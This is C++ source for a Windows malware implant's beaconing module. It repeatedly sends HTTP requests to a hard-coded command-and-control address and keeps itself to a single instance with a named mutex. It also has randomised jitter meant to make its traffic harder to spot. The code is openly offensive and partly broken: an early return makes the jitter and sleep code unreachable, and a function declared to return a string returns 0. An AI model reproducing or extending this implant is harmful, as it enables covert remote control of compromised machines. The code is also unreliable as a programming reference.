#include "implant.h"
#include "xhttp.h"
#include <chrono>
#include <thread>
#include <random>
#include <stdexcept>
#include <iostream>
#include <future>
#include <string>
#include <Windows.h>

namespace implant {
std::string url = "http://192.168.1.147:8443/test";
const int baseWaitTime = 5000; // 5 second
const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
// Calculate the final wait time with jitter

bool isRunning = true;

void beacon() {
    while (true) {
        // Call the beaconLogic function asynchronously and store the future object
        std::future<void> future_result = std::async(std::launch::async, [](){
            beaconLogic();
        });

        // Wait for the asynchronous operation to complete
        future_result.get();

    }
}

std::string beaconLogic() {
    HANDLE hMutex;
    // create mutex with a name so multiple instances can detect it
    hMutex = CreateMutexA(NULL, FALSE, "BeaconMutex");
    // check if the mutex already exists
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        // if this process created the mutex, exit the application
        if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        printf("BeaconMutex already exists, beacon already running\n");
        CloseHandle(hMutex);
        return 0;
        }
    }
    while (isRunning) {
        try {
            std::cerr << url << std::endl;
            std::string response = xhttp::http_get(url);
            std::cerr << response << std::endl;
            return response;

            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
            double jitter = distrib(gen);
            int waitTimeWithJitter = baseWaitTime + static_cast<int>(jitter);

            std::cout << "Wait time with jitter: " << waitTimeWithJitter << " milliseconds" << std::endl;

            // Sleep for the calculated time
            std::this_thread::sleep_for(std::chrono::milliseconds(waitTimeWithJitter));

        }
        catch (const std::exception& e) {
            printf("\nBeaconing error: %s\n", e.what());
            // Try beacon again.
            // If failed 5 times go to onFail()
        }
    }
    // cleanup
    if (hMutex)
        CloseHandle(hMutex);
    return 0;
    // Return a message indicating that the beacon loop exited
    return "Exited beacon loop";
}


}